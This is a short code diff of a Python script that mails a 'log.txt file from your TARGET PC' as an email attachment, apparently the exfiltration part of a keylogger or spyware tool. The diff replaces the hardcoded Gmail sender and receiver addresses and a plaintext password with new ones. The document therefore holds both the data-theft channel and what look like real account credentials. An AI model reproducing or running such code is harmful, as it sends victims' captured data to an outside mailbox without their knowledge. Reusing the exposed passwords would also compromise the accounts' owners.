@@ -7,9 +7,9 @@ from email.mime.text import MIMEText
 
 subject = "An email with attachment from Python"
 body = "The log.txt file from your TARGET PC: ~> "
-sender_email = "zdz.org@gmail.com"
-receiver_email = "zdz.org@gmail.com"
-password = "Zdz282612"
+sender_email = "zhouzhidong19941012@gmail.com"
+receiver_email = "zhouzhidong19941012@gmail.com"
+password = "Zz282612"
 
 # Create a multipart message and set headers
 message = MIMEMultipart()
